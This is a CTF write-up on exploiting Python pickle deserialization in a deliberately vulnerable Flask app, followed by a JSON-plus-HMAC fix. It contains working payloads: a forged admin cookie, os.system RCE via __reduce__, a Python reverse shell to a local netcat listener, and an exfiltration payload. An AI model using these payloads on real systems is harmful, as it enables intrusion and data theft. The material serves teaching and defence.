---
title: "Web - Insecure Deserialization"
description: "Exploiting Python pickle deserialization in a Flask application to achieve remote code execution and capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Hard               |
| Points     | 350                |
| Flag       | `zemi{d3s3r14l1z3_th1s}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-deserialization/app.py)
- [flag.txt](/Website/challenges/web-deserialization/flag.txt)
- [README.md](/Website/challenges/web-deserialization/README.md)
- [requirements.txt](/Website/challenges/web-deserialization/requirements.txt)

## Overview

Serialization is the process of converting an object into a byte stream so it can be stored or transmitted. Deserialization is the reverse — reconstructing the object from the byte stream. The vulnerability arises when an application deserializes data from an untrusted source. In Python, the `pickle` module is notorious for this: unpickling attacker-controlled data leads directly to arbitrary code execution.

The Python `pickle` documentation itself warns:

> **Warning:** The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling.

## Setting Up the Challenge Locally

Save the following as `app.py` and run it with `python3 app.py`:

```python
from flask import Flask, request, jsonify, make_response
import pickle
import base64
import os

app = Flask(__name__)

# Create the flag file
with open("flag.txt", "w") as f:
    f.write("zemi{d3s3r14l1z3_th1s}")

class UserSession:
    def __init__(self, username, role):
        self.username = username
        self.role = role

    def __repr__(self):
        return f"UserSession(username={self.username}, role={self.role})"

@app.route("/")
def index():
    return """
    <h1>Pickle Shop</h1>
    <p>POST /login with {"username": "guest", "password": "guest"}</p>
    <p>GET /dashboard (requires session cookie)</p>
    <p>GET /admin (requires admin role in session)</p>
    """

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username", "")
    password = data.get("password", "")

    if username == "guest" and password == "guest":
        session = UserSession(username="guest", role="user")
        # VULNERABLE: Serializing user session with pickle and storing in a cookie
        session_data = base64.b64encode(pickle.dumps(session)).decode()
        resp = make_response(jsonify({"message": f"Welcome, {username}!"}))
        resp.set_cookie("session", session_data)
        return resp

    return jsonify({"error": "Invalid credentials"}), 401

@app.route("/dashboard")
def dashboard():
    session_cookie = request.cookies.get("session")
    if not session_cookie:
        return jsonify({"error": "Not logged in"}), 401

    try:
        # VULNERABLE: Deserializing untrusted data from the cookie!
        session_data = pickle.loads(base64.b64decode(session_cookie))
    except Exception as e:
        return jsonify({"error": f"Invalid session: {str(e)}"}), 400

    return jsonify({
        "message": f"Hello, {session_data.username}!",
        "role": session_data.role
    })

@app.route("/admin")
def admin():
    session_cookie = request.cookies.get("session")
    if not session_cookie:
        return jsonify({"error": "Not logged in"}), 401

    try:
        session_data = pickle.loads(base64.b64decode(session_cookie))
    except Exception as e:
        return jsonify({"error": f"Invalid session: {str(e)}"}), 400

    if session_data.role != "admin":
        return jsonify({"error": "Admin access required"}), 403

    return jsonify({"message": "Welcome, admin!", "flag": "zemi{d3s3r14l1z3_th1s}"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

The app runs at `http://localhost:5000`.

## How Python Pickle Works

Pickle is Python's built-in serialization format. It can serialize almost any Python object into a byte stream:

```python
import pickle

data = {"name": "guest", "role": "user"}
serialized = pickle.dumps(data)    # Object -> bytes
deserialized = pickle.loads(serialized)  # bytes -> Object
```

The dangerous part is the `__reduce__` method. When pickle deserializes an object, it calls `__reduce__()` to reconstruct it. If an attacker defines a class with a custom `__reduce__` that returns `os.system` or `subprocess.Popen`, the command executes during deserialization:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        # This is called during pickle.loads()
        # It returns a callable and its arguments
        return (os.system, ("id",))

# When this is unpickled, os.system("id") runs
payload = pickle.dumps(Exploit())
pickle.loads(payload)  # Executes: os.system("id")
```

## Reconnaissance

### Step 1: Login and inspect the cookie

```bash
curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' \
  -c cookies.txt -v 2>&1 | grep "Set-Cookie"
```

Output:

```
< Set-Cookie: session=gASVNQAAAAAAAACMCF9fbWFpbl9flIwLVXNlclNlc3Npb26Uk5SMBWd1ZXN0lIwEdXNlcpSGlGIu; Path=/
```

The `session` cookie is Base64-encoded pickle data.

### Step 2: Decode the cookie

```python
import base64
import pickle

cookie = "gASVNQAAAAAAAACMCF9fbWFpbl9flIwLVXNlclNlc3Npb26Uk5SMBWd1ZXN0lIwEdXNlcpSGlGIu"
data = pickle.loads(base64.b64decode(cookie))
print(data)
print(f"Username: {data.username}")
print(f"Role: {data.role}")
```

Output:

```
UserSession(username=guest, role=user)
Username: guest
Role: user
```

The cookie contains a serialized Python object with our username and role. The server deserializes it on every request with `pickle.loads()` — and it trusts whatever we send.

## Exploitation

### Step 1: Craft a privilege escalation payload

First, let's try to become admin by forging a session object:

```python
#!/usr/bin/env python3
"""Forge an admin session cookie."""

import pickle
import base64

class FakeSession:
    def __init__(self):
        self.username = "admin"
        self.role = "admin"

payload = base64.b64encode(pickle.dumps(FakeSession())).decode()
print(f"Admin cookie: {payload}")
```

```bash
python3 forge_admin.py
# Copy the output cookie value

curl -s http://localhost:5000/admin \
  -b "session=<forged-cookie>" | python3 -m json.tool
```

Response:

```json
{
    "message": "Welcome, admin!",
    "flag": "zemi{d3s3r14l1z3_th1s}"
}
```

That gives us the flag. But let's go further and demonstrate the full RCE impact.

### Step 2: Remote Code Execution via pickle

```python
#!/usr/bin/env python3
"""Generate a malicious pickle payload that executes a command."""

import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        # This command will execute on the server when pickle.loads() is called
        return (os.system, ("cat flag.txt > /tmp/pwned.txt",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"RCE cookie: {payload}")
```

```bash
python3 rce_payload.py
# Copy the cookie value

curl -s http://localhost:5000/dashboard \
  -b "session=<rce-cookie>"
```

The server will execute `cat flag.txt > /tmp/pwned.txt` during deserialization. The response may show an error (because the deserialized result is not a `UserSession` object), but the command has already executed.

### Step 3: Reverse shell payload

For a full reverse shell (for demonstration in a local lab only):

```python
#!/usr/bin/env python3
"""Generate a reverse shell pickle payload."""

import pickle
import base64
import os

class ReverseShell:
    def __reduce__(self):
        return (os.system, (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"127.0.0.1\",9999));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'",
        ))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
print(f"Reverse shell cookie: {payload}")
```

```bash
# Terminal 1: Start listener
nc -lvnp 9999

# Terminal 2: Send the payload
curl -s http://localhost:5000/dashboard \
  -b "session=<reverse-shell-cookie>"
```

### Step 4: Data exfiltration without a reverse shell

If you cannot get a reverse shell, exfiltrate data through the HTTP response by using `subprocess` instead of `os.system`:

```python
#!/usr/bin/env python3
"""Pickle payload that returns command output."""

import pickle
import base64
import subprocess

class ExfilPayload:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "flag.txt"],))

payload = base64.b64encode(pickle.dumps(ExfilPayload())).decode()
print(f"Exfil cookie: {payload}")
```

When the server unpickles this, `pickle.loads()` returns the output of `cat flag.txt` as a bytes object. Depending on how the application handles it, the flag may appear in the response or in an error message.

## Understanding the Pickle Protocol

You can disassemble a pickle payload to see what it does:

```python
import pickle
import pickletools
import base64

cookie = "<malicious-cookie-here>"
raw = base64.b64decode(cookie)
pickletools.dis(raw)
```

Output for an RCE payload:

```
    0: \x80 PROTO      4
    2: \x95 FRAME      ...
   11: \x8c SHORT_BINUNICODE 'nt' (or 'posix')
   ...       SHORT_BINUNICODE 'system'
   ...       SHORT_BINUNICODE 'cat flag.txt'
   ...  R    REDUCE
   ...  .    STOP
```

The `REDUCE` opcode is the dangerous one — it calls a function with arguments. When you see `REDUCE` with `system` or `exec`, that is RCE.

## The Vulnerable Code (Explained)

```python
@app.route("/dashboard")
def dashboard():
    session_cookie = request.cookies.get("session")
    # VULNERABLE: pickle.loads() on user-controlled input.
    # The cookie is a Base64-encoded pickle payload that the client
    # can modify freely. Pickle will execute arbitrary code during
    # deserialization via the __reduce__ method.
    session_data = pickle.loads(base64.b64decode(session_cookie))
    return jsonify({"message": f"Hello, {session_data.username}!"})
```

## The Fix

**Never use pickle to deserialize untrusted data.** Use a safe serialization format like JSON, and sign your session data with HMAC to prevent tampering.

```python
from flask import Flask, request, jsonify, make_response
import json
import hmac
import hashlib
import base64

app = Flask(__name__)
SECRET_KEY = os.urandom(32)  # Strong random secret

def sign_session(data):
    """Create a signed session cookie using JSON + HMAC."""
    payload = base64.b64encode(json.dumps(data).encode()).decode()
    signature = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()
    return f"{payload}.{signature}"

def verify_session(cookie):
    """Verify and decode a signed session cookie."""
    try:
        payload, signature = cookie.rsplit(".", 1)
        expected_sig = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(signature, expected_sig):
            return None  # Tampered!
        return json.loads(base64.b64decode(payload))
    except Exception:
        return None

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    if data.get("username") == "guest" and data.get("password") == "guest":
        session_data = {"username": "guest", "role": "user"}
        resp = make_response(jsonify({"message": "Welcome!"}))
        resp.set_cookie("session", sign_session(session_data))
        return resp
    return jsonify({"error": "Invalid credentials"}), 401

@app.route("/dashboard")
def dashboard():
    cookie = request.cookies.get("session")
    session_data = verify_session(cookie)
    if not session_data:
        return jsonify({"error": "Invalid or tampered session"}), 401
    return jsonify({"message": f"Hello, {session_data['username']}!"})
```

Key changes:
1. **Use JSON instead of pickle** — JSON cannot execute code during parsing
2. **HMAC signature** — the cookie is signed with a server-side secret; if the client modifies the payload, the signature will not match
3. **`hmac.compare_digest()`** — constant-time comparison to prevent timing attacks
4. Even better: **use Flask's built-in session** (`flask.session`) which uses `itsdangerous` for signed cookies, or use server-side sessions with a session store

## Deserialization in Other Languages

This vulnerability is not Python-specific:

| Language | Dangerous Function | Safe Alternative |
|----------|-------------------|------------------|
| Python | `pickle.loads()` | JSON, `marshmallow` |
| Java | `ObjectInputStream.readObject()` | JSON with Jackson/Gson |
| PHP | `unserialize()` | `json_decode()` |
| Ruby | `Marshal.load()` | JSON, `safe_load` |
| .NET | `BinaryFormatter.Deserialize()` | JSON with `System.Text.Json` |
| Node.js | `node-serialize` `unserialize()` | `JSON.parse()` |

## Tools Used

- **curl** — sending requests with modified cookies
- **Python** — crafting pickle payloads and decoding cookies
- **pickletools** — disassembling pickle payloads for analysis
- **Netcat (`nc`)** — catching reverse shells in the local lab
- **Burp Suite** — (optional) intercepting and modifying cookies in a browser

## Lessons Learned

- **Never** deserialize untrusted data with `pickle`, `Marshal`, `unserialize()`, or any native serialization format
- Use JSON for data interchange — it is data-only and cannot execute code
- Always sign cookies and session data with HMAC to prevent tampering
- If you must use pickle (e.g., for internal caching), ensure the data source is completely trusted and integrity-verified
- The `__reduce__` method in Python gives an attacker full control over what gets executed during unpickling — there is no way to make `pickle.loads()` safe on untrusted input
- Use Flask's built-in signed sessions or a server-side session store instead of rolling your own session management
- When you see Base64-encoded cookies, always decode them — if you see pickle byte signatures (`\x80\x04\x95`), you may have found a deserialization vulnerability
